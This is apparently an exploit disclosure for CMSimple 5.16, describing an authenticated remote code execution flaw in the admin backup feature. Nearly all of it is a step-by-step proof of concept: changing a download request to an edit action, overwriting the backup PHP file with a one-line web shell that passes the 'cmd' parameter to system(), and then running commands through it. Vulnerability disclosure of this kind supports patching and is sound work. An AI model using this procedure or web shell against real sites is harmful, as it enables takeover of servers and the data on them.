
## Basic Info

- **Exploit Title:** CMSimple 5.16 backup file RCE (Authenticated)
- **Exploit Author:** h4ckr4v3n
- **Vendor Homepage:** https://www.cmsimple.org/
- **Version:** 5.16
- **Tested on:** Ubuntu 22.04/PHP 7.4/Nginx 1.18.0

## Description
Functionality of downloading php backup files in CMSimple 5.16 allows a user with administrator rights to inject and execute arbitrary php code

## Proof of Concept

1) Log In as Administrator.
2) Navigate to "Backup" tab.
3) Click on "download" button near content or pagedata file and intercept outgoing request.
4) Change GET request `/?file=content&action=download` to    `/?file=content&action=edit`
5) In code editor delete PHP-code to access file directly and put your payload: `<?php system($_GET['cmd']);?>`
6) Save file.
7) Now you can execute commands via cmd parameter: `/content/content.php?cmd=id`
![[cmsimpl_backup_rce1.png]]
![[cmsimpl_backup_rce2.png]]
![[cmsimpl_backup_rce3.png]]
![[cmsimpl_backup_rce4.png]]
